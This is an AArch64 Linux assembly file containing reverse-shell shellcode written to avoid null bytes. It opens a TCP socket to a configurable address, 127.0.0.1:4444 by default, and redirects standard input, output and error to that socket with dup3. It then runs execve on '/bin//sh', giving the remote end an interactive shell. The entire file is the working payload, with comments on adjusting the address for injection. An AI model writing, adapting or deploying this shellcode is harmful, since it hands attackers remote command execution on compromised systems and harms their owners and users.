.section .text
	.global _start

_start:
	// Move the stack so stack operations don't mess with shellcode flow
	add sp, sp, 0x120
	// setup registers
	mov x0, xzr
	mov x1, xzr
	mov x2, xzr
	mov x3, xzr
	// socket syscall number
	mov x8, #198
	// family - AF_INET
	add x3, x3, #255
	sub x0, x3, #253
	// type - SOCK_STREAM
	sub x1, x3, #254
	// protocol - IPPROTO_TCP
	sub x2, x3, #249
	// socket syscall
	svc #2468

	// save socket fd
	mov x14, xzr
	add x14, x0, #1023
	sub x14, x14, #1023

	// create sockaddr_in struct on the stack
	// family
	sub x4, x3, #253
	// port
	mov x1, #4444
	bfi w2, w1, #8, #8
	lsr w1, w1, #8
	lsr w2, w2, #8
	orr w5, w1, w2, lsl #8
	orr x4, x4, x5, lsl #16

	// addr, you might need to do some weird things with the x3 register (gave a high number earlier) to avoid null bytes which will be in the example, this uses 127.0.0.1 as a default

	mov x1, xzr
	sub x1, x3, #254

	mov x2, xzr

	orr x1, x1, xzr, lsl #8

	mov x2, xzr
	orr x1, x1, xzr, lsl #16

	add x2, x3, #100
	sub x2, x2, #228
	orr x1, x2, x1, lsl #24
	
	// Combine the addr number with the rest of the sockaddr_in struct
	orr x1, x4, x1, lsl #32
	// Store it on the stack
	str x1, [sp, #-4]
	mov x1, xzr
	str x1, [sp, #-12]

	// Connect the socket
	// connect syscall number
	mov x8, #203
	// fd
	mov x0, x14
	// sockaddr struct 
	add x1, sp, #100
	sub x1, x1, #104
	// count
	mov x2, xzr
	add x2, x2, #116
	sub x2, x2, #100
	// connect syscall
	svc #2468

	// foward stdin/out/error through the socket
	// stdin
	// dup3 syscall number
	sub x8, x3, #231
	// oldfd
	mov x0, x14
	// newfd
	mov x1, xzr
	mov x2, xzr
	// dup3
	svc #2468

	// stdout
	// oldfd
	mov x0, x14
	// newfd
	sub x1, x3, #254
	// dup3
	svc #2468

	// stderror
	// oldfd
	mov x0, x14
	// newfd
	sub x1, x3, #253
	// dup3
	svc #2468

	// start the shell
	// execve syscall number
	mov x8, #221
	// filename and argv
	movz x0, #0x622f
	movk x0, #0x6e69, lsl #16
	movk x0, #0x2f2f, lsl #32
	movk x0, #0x6873, lsl #48
	
	mov x1, xzr
	str x1, [sp, #-4]
	str x0, [sp, #-8]

	add x4, sp, #100
	sub x0, x4, #108
	// env
	mov x2, xzr
	// execve
	svc #2468
